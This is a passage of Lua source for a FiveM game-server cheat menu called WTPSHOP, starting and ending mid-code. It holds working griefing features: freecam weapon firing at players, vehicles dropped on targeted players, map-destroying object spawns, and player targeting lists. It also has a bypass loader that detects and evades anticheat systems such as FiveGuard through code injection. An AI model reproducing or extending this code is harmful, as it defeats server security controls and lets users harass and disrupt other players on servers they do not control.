    else
        local handle, ped = FindFirstPed()
        local success

        repeat
            if ped and IsPedAPlayer(ped) and DoesEntityExist(ped) then
                local playerId = NetworkGetPlayerIndexFromPed(ped)
                if playerId ~= -1 and (includePlayer or playerId ~= PlayerId()) then
                    local playerCoords = GetEntityCoords(ped)
                    if playerCoords then
                        local distance = #(coords - playerCoords)
                        if distance <= maxDistance then
                            nearby[#nearby + 1] = {
                                name = GetPlayerName(playerId),
                                serverId = GetPlayerServerId(playerId)
                            }
                        end
                    end
                end
            end
            success, ped = FindNextPed(handle)
        until not success
        EndFindPed(handle)
    end

    if #nearby == 0 then
        nearby = {}
    end

    return nearby
end

CreateThread(function()
    WTPSHOP:Initialize()
    WTPSHOP:BuildDefaultMenu()
    WTPSHOP:UpdateElements(CurrentMenu)
    Wait(500)
    WTPSHOP:Notify("success", "WTPSHOP", "Menu ready.", 3200)
    Wait(500)

    WTPSHOP:SendMessage({ action = "updateBanner", bannerColor = "255, 255, 255", bannerLink = "https://royalcdn.pages.dev/titenirobinz/wtp1-d6fd8cf3a1e0.gif" })
    MenuKey = MenuKey or "H"
    KeyboardInput("Choose Menu Key (default H)", "", function(val)
        for vk, name in pairs(MappedKeys) do
            if name:lower() == val:lower() then
                MenuKey = name
                break
            end
        end
        MenuOpenable = true
        WTPSHOP:Notify("info", "WTPSHOP", ("Press %s to open the menu."):format(MenuKey), 4500)
    end, "keybind")

    local lastSliderPress = 0
    local sliderDelay = 120

    while true do
        Wait(0)

        if FreecamEnabled then
            local hoveredOption = FreecamOptions[FreecamHoveredIndex]

            -- Scroll Wheel
            if IsControlJustReleased(0, 14) then -- Wheel Down
                FreecamHoveredIndex = (FreecamHoveredIndex % #FreecamOptions) + 1
                MachoSendDuiMessage(DUI, json.encode({ action = "scroll", direction = "down" }))
            end

            if IsControlJustReleased(0, 15) then -- Wheel Up
                FreecamHoveredIndex = (FreecamHoveredIndex - 2) % #FreecamOptions + 1
                MachoSendDuiMessage(DUI, json.encode({ action = "scroll", direction = "up" }))
            end

            if hoveredOption == "Shoot Weapon" then
                if IsDisabledControlJustPressed(0, 44) then -- Q
                    CurrentWeaponIndex = (CurrentWeaponIndex - 2) % #FreecamWeaponList + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateWeapon", index = CurrentWeaponIndex }))
                end
                if IsDisabledControlJustPressed(0, 38) then -- E
                    CurrentWeaponIndex = (CurrentWeaponIndex % #FreecamWeaponList) + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateWeapon", index = CurrentWeaponIndex }))
                end
            elseif hoveredOption == "Shoot Vehicle" then
                if IsDisabledControlJustPressed(0, 44) then -- Q
                    CurrentVehicleIndex = (CurrentVehicleIndex - 2) % #FreecamVehicleList + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateVehicle", index = CurrentVehicleIndex }))
                end
                if IsDisabledControlJustPressed(0, 38) then -- E
                    CurrentVehicleIndex = (CurrentVehicleIndex % #FreecamVehicleList) + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateVehicle", index = CurrentVehicleIndex }))
                end
            elseif hoveredOption == "Map Destroyer" then
                if IsDisabledControlJustPressed(0, 44) then -- Q
                    CurrentMapDestroyerIndex = (CurrentMapDestroyerIndex - 2) % #FreecamMapDestroyerList + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateMap", index = CurrentMapDestroyerIndex }))
                end
                if IsDisabledControlJustPressed(0, 38) then -- E
                    CurrentMapDestroyerIndex = (CurrentMapDestroyerIndex % #FreecamMapDestroyerList) + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateMap", index = CurrentMapDestroyerIndex }))
                end
            elseif hoveredOption == "Spawn Object" then
                if IsDisabledControlJustPressed(0, 44) then -- Q
                    CurrentSpawnObjectIndex = (CurrentSpawnObjectIndex - 2) % #FreecamSpawnObjectList + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateObject", index = CurrentSpawnObjectIndex }))
                end
                if IsDisabledControlJustPressed(0, 38) then -- E
                    CurrentSpawnObjectIndex = (CurrentSpawnObjectIndex % #FreecamSpawnObjectList) + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateObject", index = CurrentSpawnObjectIndex }))
                end
            end

            if IsDisabledControlPressed(0, 24) then
                local action = hoveredOption
                if action == "Shoot Weapon" then
                    local weapon = FreecamWeaponList[CurrentWeaponIndex]

                    if weapon == "WEAPON_PERMKILL" then
                        weapon = "WEAPON_TRANQUILIZER"
                    elseif weapon == "WEAPON_RPG_2" then
                        weapon = "WEAPON_AIRSTRIKE_ROCKET"
                    end

                    if weapon ~= LastWeaponFired then
                        LastWeaponFired = weapon
                        -- print(("weapon: %s, LastWeaponFired: %s"):format(weapon, LastWeaponFired))
                    end

                    WTPSHOP:SoftEnsureBypass()
                    ApiRasclat.ExecuteFeature("weapons", string.format([[
                        if _G.WTPSHOPFreecamObject then
                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            local camCoords = WTPSHOP.Native(GetCamCoord, _G.WTPSHOPFreecamObject)
                            local camRot = WTPSHOP.Native(GetCamRot, _G.WTPSHOPFreecamObject, 2)
                            local forward = RotationToDirection(camRot)
                            local targetPos = camCoords + forward * 1000.0
                            local playerPed = WTPSHOP.Native(PlayerPedId)
                            local weaponHash = WTPSHOP.Native(GetHashKey, "%s")

                            WTPSHOP.Native(GiveWeaponToPed, playerPed, weaponHash, 30, false, true)
                            WTPSHOP.Native(SetCurrentPedWeapon, playerPed, weaponHash, true)
                            WTPSHOP.Native(ShootSingleBulletBetweenCoords,
                                camCoords.x, camCoords.y, camCoords.z,
                                targetPos.x, targetPos.y, targetPos.z,
                                100, true, weaponHash, playerPed, true, false, 100000.0)
                            WTPSHOP.Native(SetPedCurrentWeaponVisible, playerPed, false, false, true, true)
                        end
                    ]], weapon))
                end
            end

            if IsDisabledControlJustPressed(0, 24) then
                local action = hoveredOption

                if action == "Teleport" then
                    ApiRasclat.Freecam([[
                        if _G.WTPSHOPFreecamObject then
                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }
                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end
                                return -1
                            end

                            function _G.hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            _G.hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("GetEmptySeat", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)

                            local camCoords = WTPSHOP.Native(GetCamCoord, _G.WTPSHOPFreecamObject)
                            local rot = WTPSHOP.Native(GetCamRot, _G.WTPSHOPFreecamObject, 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            if hit then
                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                    local vehicle = entityHit
                                    local playerPed = PlayerPedId()
                                    local seat = GetEmptySeat(vehicle)
                                    if seat == -1 then
                                        TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                    elseif seat >= 0 then
                                        TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                    else
                                        print("[^5WTPSHOP^7]: There aren't any seats available in this vehicle.")
                                    end
                                else
                                    WTPSHOP.Native(SetEntityCoordsNoOffset, PlayerPedId(), endCoords.x, endCoords.y, endCoords.z, false, false, false)
                                end
                            else
                                print("[^5WTPSHOP^7]: There aren't any valid locations to teleport to.")
                            end
                        end
                    ]])
                elseif action == "Helicopter Attack" then
                    ApiRasclat.Freecam([[
                        if _G.WTPSHOPFreecamObject then
                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            local me = PlayerPedId()
                            local cam = WTPSHOP.Native(GetCamCoord, _G.WTPSHOPFreecamObject)
                            local rot = WTPSHOP.Native(GetCamRot, _G.WTPSHOPFreecamObject, 2)
                            local fwd = RotationToDirection(rot)

                            local rayTo = cam + fwd * 1000.0

                            local handle = StartShapeTestRay(
                                cam.x, cam.y, cam.z,
                                rayTo.x, rayTo.y, rayTo.z,
                                -1, me, 0
                            )

                            local _, hit, _, _, entityHit = GetShapeTestResult(handle)
                            if hit and entityHit ~= 0 and IsEntityAPed(entityHit) then
                                local targetPed = entityHit
                                local coords = GetEntityCoords(targetPed)
                                WTPSHOP.Native(CreateThread, function()
                                    local vehicleHash = GetHashKey("frogger")
                                    RequestModel(vehicleHash)
                                    while not HasModelLoaded(vehicleHash) do
                                        Wait(0)
                                    end
                                    local createdCar = WTPSHOP.Native(CreateVehicle, vehicleHash, coords.x, coords.y, coords.z, 0.0, true, false)
                                    WTPSHOP.Native(Wait, 200)
                                    WTPSHOP.Native(SetEntityCoords, createdCar, coords.x, coords.y, coords.z + 30, true, true, true)
                                    WTPSHOP.Native(SetVehicleEngineHealth, createdCar, -4000.0)
                                    WTPSHOP.Native(SetVehicleBodyHealth, createdCar, 0.0)
                                    WTPSHOP.Native(SetVehicleFuelLevel, createdCar, 1000.0)
                                    WTPSHOP.Native(SetEntityVelocity, createdCar, 0.0, 0.0, -80.0)
                                    WTPSHOP.Native(SetModelAsNoLongerNeeded, vehicleHash)
                                end)
                            end
                        end
                    ]])
                elseif action == "Shoot Vehicle" then
                    if IsDisabledControlPressed(0, 24) then -- LEFT CLICK
                        local model = FreecamVehicleList[CurrentVehicleIndex]

                        ApiRasclat.Freecam([[
                            if _G.WTPSHOPFreecamObject then
                                local camCoords = WTPSHOP.Native(GetCamCoord, _G.WTPSHOPFreecamObject)
                                local rot = WTPSHOP.Native(GetCamRot, _G.WTPSHOPFreecamObject, 2)

                                local function RotationToDirection(rot)
                                    local z = math.rad(rot.z)
                                    local x = math.rad(rot.x)
                                    local num = math.abs(math.cos(x))
                                    return vector3(-math.sin(z)*num, math.cos(z)*num, math.sin(x))
                                end

                                local forward = RotationToDirection(rot)
                                local shootCoords = camCoords
                                local targetCoords = camCoords + (forward * 50.0)
                                local heading = rot.z
                                local model = "]] .. model .. [["

                                local hash = GetHashKey(model)
                                RequestModel(hash)
                                while not HasModelLoaded(hash) do Wait(0) end
                                local veh = WTPSHOP.Native(CreateVehicle, hash, shootCoords.x, shootCoords.y, shootCoords.z, heading, true, false)
                                WTPSHOP.Native(SetModelAsNoLongerNeeded, hash)
                                if veh and DoesEntityExist(veh) then
                                    local vec = (targetCoords - shootCoords) * 2.0
                                    WTPSHOP.Native(SetEntityVelocity, veh, vec.x, vec.y, vec.z)
                                end
                            end
                        ]])
                    end
                elseif action == "Map Destroyer" then
                    if IsDisabledControlPressed(0, 24) then -- LEFT CLICK
                        local object = FreecamMapDestroyerList[CurrentMapDestroyerIndex]

                        if object == "City" then
                            object = "dt1_lod_slod3"
                        elseif object == "Docks" then
                            object = "id2_lod_slod4"
                        elseif object == "Playa Vista" then
                            object = "kt1_lod_slod4"
                        elseif object == "Mountain" then
                            object = "ch2_lod_slod3"
                        elseif object == "Pink Cage" then
                            object = "hw1_lod_slod4"
                        elseif object == "Vespucci" then
                            object = "kt1_lod_slod4"
                        elseif object == "Mega Mall" then
                            object = "sc1_lod_slod4"
                        elseif object == "Platform" then
                            object = "xs_propint2_building_base_01"
                        elseif object == "Big Ring" then
                            object = "ar_prop_ar_neon_gate8x_02a"
                        elseif object == "Tube" then
                            object = "sr_prop_stunt_tube_xs_02a"
                        elseif object == "Dessert" then
                            object = "xs_terrain_set_dyst_01_grnd"
                        elseif object == "Goal" then
                            object = "xs_prop_arena_goal"
                        elseif object == "Big Statue 2" then
                            object = "xs_propint3_waste_01_statues"
                        elseif object == "House" then
                            object = "sum_prop_ac_track_paddock_01"
                        end

                        ApiRasclat.Freecam([[
                            if _G.WTPSHOPFreecamObject then
                                local camCoords = WTPSHOP.Native(GetCamCoord, _G.WTPSHOPFreecamObject)
                                local rot = WTPSHOP.Native(GetCamRot, _G.WTPSHOPFreecamObject, 2)
                                local function RotationToDirection(r)
                                    local z = math.rad(r.z)
                                    local x = math.rad(r.x)
                                    local num = math.abs(math.cos(x))
                                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                end
                                local forward = RotationToDirection(rot)
                                local targetCoords = camCoords + (forward * 10.0)
                                local heading = rot.z
                                local modelName = "]] .. object .. [["
                                WTPSHOP.Native(CreateThread, function()
                                    local model = WTPSHOP.Native(GetHashKey, modelName)
                                    WTPSHOP.Native(RequestModel, model)
                                    
                                    local timeout = WTPSHOP.Native(GetGameTimer) + 5000
                                    while not WTPSHOP.Native(HasModelLoaded, model) and WTPSHOP.Native(GetGameTimer) < timeout do
                                        WTPSHOP.Native(Wait, 10)
                                    end
                                    if not WTPSHOP.Native(HasModelLoaded, model) then return end
                                    local obj = WTPSHOP.Native(CreateObject, model, targetCoords.x, targetCoords.y, targetCoords.z, true, true, false)
                                    if obj ~= 0 and WTPSHOP.Native(DoesEntityExist, obj) then
                                        WTPSHOP.Native(SetEntityHeading, obj, heading)
                                        WTPSHOP.Native(PlaceObjectOnGroundProperly, obj)
                                        WTPSHOP.Native(SetEntityAsMissionEntity, obj, true, true)
                                    end
                                    
                                    WTPSHOP.Native(SetModelAsNoLongerNeeded, model)
                                end)
                            end
                        ]])
                    end
                elseif action == "Spawn Object" then
                    if IsDisabledControlPressed(0, 24) then -- LEFT CLICK
                        local object = FreecamSpawnObjectList[CurrentSpawnObjectIndex]

                        if object == "Big Tires" then
                            object = "xs_propint4_waste_07_tires"
                        elseif object == "Dome" then
                            object = "xs_propint2_building_03"
                        elseif object == "Black Surface" then
                            object = "vw_prop_vw_bblock_huge_04"
                        elseif object == "Spinning Object" then
                            object = "xs_propint2_platform_03"
                        elseif object == "Arena Fire" then
                            object = "xs_prop_arena_pit_fire_03a_wl"
                        elseif object == "Landmine" then
                            object = "xs_prop_arena_landmine_03a_sf"
                        elseif object == "Big Wheels" then
                            object = "xs_prop_arena_turntable_02a_wl"
                        elseif object == "Cnt Arena" then
                            object = "xs_prop_arena_turntable_02a"
                        elseif object == "Arena Skull" then
                            object = "xs_prop_arena_landmine_01a"
                        elseif object == "Arena Bomb" then
                            object = "xs_prop_arena_bomb_m"
                        elseif object == "Waste Rims" then
                            object = "xs_propint3_waste_02_rims"
                        end

                        ApiRasclat.Freecam([[
                            if _G.WTPSHOPFreecamObject then
                                local camCoords = WTPSHOP.Native(GetCamCoord, _G.WTPSHOPFreecamObject)
                                local rot = WTPSHOP.Native(GetCamRot, _G.WTPSHOPFreecamObject, 2)
                                local function RotationToDirection(r)
                                    local z = math.rad(r.z)
                                    local x = math.rad(r.x)
                                    local num = math.abs(math.cos(x))
                                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                end
                                local forward = RotationToDirection(rot)
                                local targetCoords = camCoords + (forward * 10.0)
                                local heading = rot.z
                                local modelName = "]] .. object .. [["
                                WTPSHOP.Native(CreateThread, function()
                                    local model = WTPSHOP.Native(GetHashKey, modelName)
                                    WTPSHOP.Native(RequestModel, model)
                                    
                                    local timeout = WTPSHOP.Native(GetGameTimer) + 5000
                                    while not WTPSHOP.Native(HasModelLoaded, model) and WTPSHOP.Native(GetGameTimer) < timeout do
                                        WTPSHOP.Native(Wait, 10)
                                    end
                                    if not WTPSHOP.Native(HasModelLoaded, model) then return end
                                    local obj = WTPSHOP.Native(CreateObject, model, targetCoords.x, targetCoords.y, targetCoords.z, true, true, false)
                                    if obj ~= 0 and WTPSHOP.Native(DoesEntityExist, obj) then
                                        WTPSHOP.Native(SetEntityHeading, obj, heading)
                                        WTPSHOP.Native(PlaceObjectOnGroundProperly, obj)
                                        WTPSHOP.Native(SetEntityAsMissionEntity, obj, true, true)
                                    end
                                    
                                    WTPSHOP.Native(SetModelAsNoLongerNeeded, model)
                                end)
                            end
                        ]])
                    end
                end
            end
        end

        local hoveredTab = CurrentMenu[HoveredIndex]

        if hoveredTab then
            if hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" then
                local maxVal = hoveredTab.max or 100
                local now = GetGameTimer()

                if maxVal <= 10 then
                    if IsControlPressed(0, 174) and now - lastSliderPress > sliderDelay then
                        WTPSHOP:ScrollTwo("Left")
                        lastSliderPress = now
                    elseif IsControlPressed(0, 175) and now - lastSliderPress > sliderDelay then
                        WTPSHOP:ScrollTwo("Right")
                        lastSliderPress = now
                    end
                else
                    if IsControlPressed(0, 174) then
                        WTPSHOP:ScrollTwo("Left")
                    elseif IsControlPressed(0, 175) then
                        WTPSHOP:ScrollTwo("Right")
                    end
                end
            end
        end
    end
end)

local lastScrollPress = 0
local scrollDelay = 120
local lastSliderPress = 0
local sliderDelay = 120
local lastCategoryPress = 0
local categoryDelay = 120

MachoOnKeyDown(function(Callback)
    local keyCode = tonumber(Callback) or Callback
    local keyName = MappedKeys[keyCode] or "Unknown"
    local scrollNow = GetGameTimer()

    if keyName == MenuKey then
        if not IsVisible and MenuOpenable then
            WTPSHOP:ShowUI()
        end
    elseif keyName == "Backspace" then
        if IsVisible and MenuOpenable then WTPSHOP:Backspace() end
    elseif keyName == "Enter" then
        if IsVisible and MenuOpenable then WTPSHOP:Enter() end
    elseif keyName == "Q" and scrollNow - lastCategoryPress > categoryDelay then
        if IsVisible and MenuOpenable then WTPSHOP:PrevCategory() end
    elseif keyName == "E" and scrollNow - lastCategoryPress > categoryDelay then
        if IsVisible and MenuOpenable then WTPSHOP:NextCategory() end
    elseif keyName == "ArrowUp" and scrollNow - lastScrollPress > scrollDelay then
        if IsVisible then WTPSHOP:ScrollOne("Up") lastScrollPress = scrollNow end
    elseif keyName == "ArrowDown" and scrollNow - lastScrollPress > scrollDelay then
        if IsVisible then WTPSHOP:ScrollOne("Down") lastScrollPress = scrollNow end
    elseif keyName == "ArrowLeft" then
        local hoveredTab = CurrentMenu[HoveredIndex]
        if hoveredTab then
            if hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" and scrollNow - lastSliderPress > sliderDelay then
                local maxVal = hoveredTab.max or 100
                local now = GetGameTimer()

                if maxVal <= 10 then
                    WTPSHOP:ScrollTwo("Left")
                    lastSliderPress = now
                else
                    WTPSHOP:ScrollTwo("Left")
                end
            elseif hoveredTab.type == "scrollable" or hoveredTab.type == "scrollable-checkbox" then
                WTPSHOP:ScrollTwo("Left")
            end
        end
    elseif keyName == "ArrowRight" then
        local hoveredTab = CurrentMenu[HoveredIndex]
        if hoveredTab then
            if hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" and scrollNow - lastSliderPress > sliderDelay then
                local maxVal = hoveredTab.max or 100
                local now = GetGameTimer()

                if maxVal <= 10 then
                    WTPSHOP:ScrollTwo("Right")
                    lastSliderPress = now
                else
                    WTPSHOP:ScrollTwo("Right")
                end
            elseif hoveredTab.type == "scrollable" or hoveredTab.type == "scrollable-checkbox" then
                WTPSHOP:ScrollTwo("Right")
            end
        end
    elseif keyName == "PageDown" then
        local hoveredTab = CurrentMenu[HoveredIndex]
        if IsVisible and MenuOpenable and hoveredTab and (hoveredTab.type == "button" or hoveredTab.type == "checkbox" or hoveredTab.type == "slider-checkbox" or hoveredTab.type == "scrollable-checkbox") then
            WTPSHOP:HideUI()
            Wait(250)
            KeyboardInput(("Bind %s"):format(hoveredTab.label), "", function(val)
                for vk, name in pairs(MappedKeys) do
                    if name:lower() == val:lower() then
                        local fivemControl = VK_TO_FIVEM[vk]

                        for i, data in pairs(MenuKeybinds) do
                            if data.keyRaw == vk then
                                WTPSHOP:Notify("error", "WTPSHOP", "There is already a keybind with that key!", 3000)
                                return
                            end
                        end

                        if fivemControl then
                            MenuKeybinds[#MenuKeybinds + 1] = {
                                key = fivemControl,
                                keyRaw = vk,
                                keyLabel = MappedKeys[vk],
                                type = hoveredTab.type,
                                label = hoveredTab.label,
                                hold = hoveredTab.hold,
                                checked = hoveredTab.checked or false,
                                value = hoveredTab.value or 1.0,
                                step = hoveredTab.step or 0.25,
                                min = hoveredTab.min or 0.25,
                                max = hoveredTab.max or 5.0,
                                onSelect = hoveredTab.onSelect,
                            }

                            WTPSHOP:ShowKeybindList(MenuKeybinds)
                        end

                        Wait(500)
                        WTPSHOP:ShowUI()

                        return
                    end
                end
            end, "keybind")
        end
    else
        if MenuOpenable then
            for _, data in pairs(MenuKeybinds) do
                if data.type == "button" then
                    local key = data.keyRaw
                    if key then
                        if key == keyCode then
                            data.onSelect()
                            WTPSHOP:Notify("success", "WTPSHOP", ("You have executed %s!"):format(data.label), 3000)
                        end
                    end
                elseif data.type == "checkbox" then
                    local key = data.keyRaw
                    if key and key == keyCode then
                        data.checked = not data.checked

                        WTPSHOP:UpdateTabChecked(ActiveMenu, data.label, data.checked)

                        if data.onSelect then
                            data.onSelect(data.checked)
                        end

                        WTPSHOP:ShowKeybindList(MenuKeybinds)
                        WTPSHOP:Notify(data.checked and "success" or "error", "WTPSHOP", ("You have %s %s!"):format(data.checked and "enabled" or "disabled", data.label), 3000)

                        if IsVisible then
                            WTPSHOP:UpdateElements(CurrentMenu)
                        end
                    end
                elseif data.type == "slider-checkbox" then
                    local key = data.keyRaw
                    if key and key == keyCode then
                        data.checked = not data.checked

                        WTPSHOP:UpdateTabChecked(ActiveMenu, data.label, data.checked)

                        if data.onSelect then
                            data.onSelect(data.value, data.checked)
                        end

                        WTPSHOP:ShowKeybindList(MenuKeybinds)
                        WTPSHOP:Notify(data.checked and "success" or "error", "WTPSHOP", ("You have %s %s!"):format(data.checked and "enabled" or "disabled", data.label), 3000)

                        if IsVisible then
                            WTPSHOP:UpdateElements(CurrentMenu)
                        end
                    end
                end
            end
        end
    end
end)

function WTPSHOP:InListMenu()
    return CurrentCategories and CurrentCategories[CurrentCategoryIndex] and (CurrentCategories[CurrentCategoryIndex].label == "List" or CurrentCategories[CurrentCategoryIndex].label == "Safe")
end

function WTPSHOP:SelectEveryone()
    if not CurrentCategories or not CurrentCategories[CurrentCategoryIndex] then return end
    local category = CurrentCategories[CurrentCategoryIndex]
    if category.label ~= "List" then return end

    for i, tab in ipairs(category.tabs) do
        if tab.type == "checkbox" then
            tab.checked = true
            if tab.serverId and tonumber(tab.serverId) then
                CPlayers[tonumber(tab.serverId)] = true
            end
        end
    end

    self:UpdateElements(CurrentMenu)
end

function WTPSHOP:UnselectEveryone()
    if not CurrentCategories or not CurrentCategories[CurrentCategoryIndex] then return end
    local category = CurrentCategories[CurrentCategoryIndex]
    if category.label ~= "List" then return end

    for i, tab in ipairs(category.tabs) do
        if tab.type == "checkbox" then
            tab.checked = false
            if tab.serverId and tonumber(tab.serverId) then
                CPlayers[tonumber(tab.serverId)] = false
            end
        end
    end

    self:UpdateElements(CurrentMenu)
end

function WTPSHOP:ClearSelection()
    CPlayers = {}
    if CurrentCategories and CurrentCategories[CurrentCategoryIndex] then
        local category = CurrentCategories[CurrentCategoryIndex]
        if category.label == "List" and category.tabs then
            for _, tab in ipairs(category.tabs) do
                if tab.type == "checkbox" then
                    tab.checked = false
                end
            end
        end
    end

    WTPSHOP:UnselectEveryone()
end

function WTPSHOP:UpdateListMenu()
    if not IsVisible then return end
    if not CurrentCategories or not CurrentCategories[CurrentCategoryIndex] then return end
    local category = CurrentCategories[CurrentCategoryIndex]
    if category.label ~= "List" then return end

    local coords = GetEntityCoords(PlayerPedId())
    if not coords then return end

    local nearbyPlayers = self:GetNearbyPlayers(coords, 500.0, true)
    local dividerIndex
    for i, tab in ipairs(category.tabs) do
        if tab.type == "divider" and tab.label == "Nearby Players" then
            dividerIndex = i
            break
        end
    end
    if not dividerIndex then return end

    for i = #category.tabs, dividerIndex + 1, -1 do
        table.remove(category.tabs, i)
    end

    if #nearbyPlayers == 0 then
        category.tabs[#category.tabs + 1] = {
            type = "button",
            label = "No Nearby Players",
            disabled = true
        }
    else
        table.sort(nearbyPlayers, function(a, b) return tonumber(a.serverId) < tonumber(b.serverId) end)
        for _, player in ipairs(nearbyPlayers) do
            local sid = tonumber(player.serverId)
            if sid and player.name then
                local targetPed = GetPlayerPed(GetPlayerFromServerId(sid))
                local _, currentWeapon = GetCurrentPedWeapon(targetPed)
                local currentVehicle = GetVehiclePedIsUsing(targetPed)
                local vehicleLabel = "On Foot"
                if currentVehicle ~= 0 then
                    local model = GetEntityModel(currentVehicle)
                    local displayLabel = GetDisplayNameFromVehicleModel(model)
                    local text = GetLabelText(displayLabel)
                    vehicleLabel = (text ~= "NULL") and text or displayLabel
                end

                category.tabs[#category.tabs + 1] = {
                    type = "checkbox",
                    label = ("> %s - %s"):format(sid, player.name),
                    serverId = sid,
                    id = sid,
                    checked = CPlayers[sid] or false,
                    name = player.name,
                    vehicle = currentVehicle ~= 0 and currentVehicle or nil,
                    isDriver = GetPedInVehicleSeat(currentVehicle, -1) == targetPed,
                    metaData = {
                        { key = "Distance", value = math.floor(#(GetEntityCoords(PlayerPedId()) - GetEntityCoords(targetPed))) .. "m" },
                        { key = "Health", value = GetEntityHealth(targetPed), color = "0, 255, 17" },
                        { key = "Armour", value = GetPedArmour(targetPed), color = "0, 132, 255" },
                        { key = "Weapon", value = WeaponsLabels[currentWeapon] or "Unarmed" },
                        { key = "Vehicle", value = vehicleLabel },
                        { key = "Speed", value = math.floor(GetEntitySpeed(targetPed) * 3.6) .. " km/h" },
                    },
                    onSelect = function(checked)
                        CPlayers[sid] = checked or false
                    end
                }
            end
        end
    end

    for serverId, _ in pairs(CPlayers) do
        local stillNearby = false
        for _, player in ipairs(nearbyPlayers) do
            if tonumber(player.serverId) == tonumber(serverId) then
                stillNearby = true
                break
            end
        end
        if not stillNearby then
            CPlayers[serverId] = nil
        end
    end

    HoveredIndex = math.min(HoveredIndex or 1, math.max(1, #category.tabs))

    local ok, err = pcall(function()
        self:UpdateElements(CurrentMenu)
    end)
    if not ok then
        -- print("^7[^5WTPSHOP^7]: UI update error: " .. tostring(err))
    end
end

function WTPSHOP:AssignListMenuActions()
    if not ActiveMenu then return end

    for _, subMenu in ipairs(ActiveMenu) do
        if subMenu.label == "Online Options" and subMenu.categories then
            for _, category in ipairs(subMenu.categories) do
                if category.label == "List" and category.tabs then
                    for _, tab in ipairs(category.tabs) do
                        if tab.type == "button" then
                            if tab.label == "Select Everyone" then
                                tab.onSelect = function() WTPSHOP:SelectEveryone() end
                            elseif tab.label == "Un-Select Everyone" then
                                tab.onSelect = function() WTPSHOP:UnselectEveryone() end
                            elseif tab.label == "Clear Selection" then
                                tab.onSelect = function() WTPSHOP:ClearSelection() end
                            end
                        end
                    end
                end
            end
        end
    end
end

CreateThread(function()
    while true do
        Wait(1500)
        if WTPSHOP:InListMenu() and IsVisible then
            local ok, err = pcall(function()
                WTPSHOP:UpdateListMenu()
            end)
            if not ok then
                -- print("^7[^5WTPSHOP^7]: List update error: " .. tostring(err))
            end
        end
    end
end)

Wait(1000)

WTPSHOP:AssignListMenuActions()

function WTPSHOP:LoadBypass()
    local fgRes = resolveFiveGuardClientResource()
    if fgRes then
        self:Notify("info", "WTPSHOP", "FiveGuard client resource: " .. fgRes, 2500)
    end

    local bypassLoaded = ensureAllAcBypasses(true, true)
    if not allAcBypassesSatisfied() then
        Wait(1200)
        for _, extra in ipairs(ensureAllAcBypasses(true, false)) do
            bypassLoaded[#bypassLoaded + 1] = extra
        end
    end
    local injectCount, poolCount = 0, 0
    for _, acName in ipairs(bypassLoaded) do
        if acName:find("%(pool%-only%)") then
            poolCount = poolCount + 1
            self:Notify("info", "WTPSHOP", "AC: " .. acName, 2800)
        else
            injectCount = injectCount + 1
            self:Notify("success", "WTPSHOP", "Loaded bypass: " .. acName, 2800)
        end
    end

    if #detectedAC == 0 and injectCount == 0 and poolCount == 0 and not fgRes then
        self:Notify("info", "WTPSHOP", "No anticheat detected — pool inject only.", 3500)
    elseif allAcBypassesSatisfied() then
        self:Notify("success", "WTPSHOP",
            string.format("Bypass ready (%d inject, %d pool-only, %d AC tracked). F8: Bypass Status.",
                injectCount, poolCount, #detectedAC), 4500)
    else
        self:Notify("error", "WTPSHOP",
            string.format("Bypass incomplete — use Reload Bypass or rejoin. F8: Bypass Status. (%d/%d satisfied)",
                injectCount + poolCount, #detectedAC + (fgRes and 1 or 0)), 5500)
    end
end

if AutoLoadBypass then
    CreateThread(function()
        Wait(2000)
        if not allAcBypassesSatisfied() then
